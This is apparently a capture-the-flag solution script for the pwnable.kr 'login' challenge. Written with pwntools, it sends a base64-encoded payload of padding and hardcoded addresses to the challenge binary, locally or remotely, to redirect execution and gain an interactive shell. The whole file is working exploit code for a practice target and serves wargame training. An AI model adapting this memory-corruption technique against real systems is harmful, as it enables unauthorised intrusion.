#!/usr/bin/env python
from pwn import *
import base64
context.arch = 'i386'
local = 1
if local:
	p = process('./login')
else:
	p = remote('pwnable.kr', 9003)
gdb.attach(p)
vul = 0x08049284
buf = 0x0811eb40
payload = flat(['A' * 4, vul, buf])
p.sendline(base64.b64encode(payload))
p.interactive()
